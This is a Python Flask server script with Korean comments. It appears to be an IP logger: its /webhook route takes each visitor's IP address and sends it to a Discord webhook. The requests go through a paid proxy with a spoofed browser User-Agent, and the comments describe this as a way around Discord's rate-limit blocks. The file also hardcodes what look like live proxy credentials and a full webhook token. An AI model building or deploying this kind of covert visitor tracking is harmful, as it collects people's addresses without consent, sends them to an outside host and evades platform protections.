import requests
import datetime
import os
import time
from flask import Flask, render_template, request, jsonify

app = Flask(__name__)

# 프록시 주소 (포트를 10005번 정도로 바꿔보겠습니다. 10000번은 이미 차단됐을 수 있음)
PROXY_URL = "http://mkmp3kpf:pka5tdl4@p.tokenu.to:10005"
PROXIES = {"http": PROXY_URL, "https": PROXY_URL}

# 웹훅 URL (discordapp.com 사용)
MASKED_CHANNEL_URL = "https://discordapp.com/api/webhooks/1477910235048968275/otX6RnzhUAWP3WJRe8A_wMAQ9hWyLPSoY3kIAhYC__CIr87A1bXqoRLyWpeHnTsRPA_v"
RAW_CHANNEL_URL = "https://discordapp.com/api/webhooks/1477910235048968275/otX6RnzhUAWP3WJRe8A_wMAQ9hWyLPSoY3kIAhYC__CIr87A1bXqoRLyWpeHnTsRPA_v"

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/webhook', methods=['POST'])
def send_to_discord():
    try:
        # [중요] 프록시가 작동 중인지 IP 체크 (Render 로그에 찍힘)
        test_res = requests.get("https://api.ipify.org", proxies=PROXIES, timeout=5)
        print(f"현재 프록시 IP: {test_res.text}") # 이 IP가 Render IP와 다르면 성공!

        client_data = request.json or {}
        x_forwarded = request.headers.get('X-Forwarded-For')
        raw_ip = x_forwarded.split(',')[0].strip() if x_forwarded else request.remote_addr
        timestamp = datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')

        discord_headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36"
        }

        # 하나씩만 전송 테스트 (성공하면 2개로 늘리세요)
        payload = {
            "username": "보안 관제",
            "embeds": [{
                "title": "접속 감지 (Proxy)",
                "color": 15548997,
                "fields": [{"name": "IP", "value": f"`{raw_ip}`"}]
            }]
        }

        res = requests.post(RAW_CHANNEL_URL, json=payload, headers=discord_headers, proxies=PROXIES, timeout=10)
        print(f"Webhook Status: {res.status_code}")
        if res.status_code == 429:
            print(f"디스코드 차단 내용: {res.text}") # 왜 차단됐는지 상세 이유 출력

    except Exception as e:
        print(f"에러 상세: {e}")

    return jsonify({"status": "ok"})
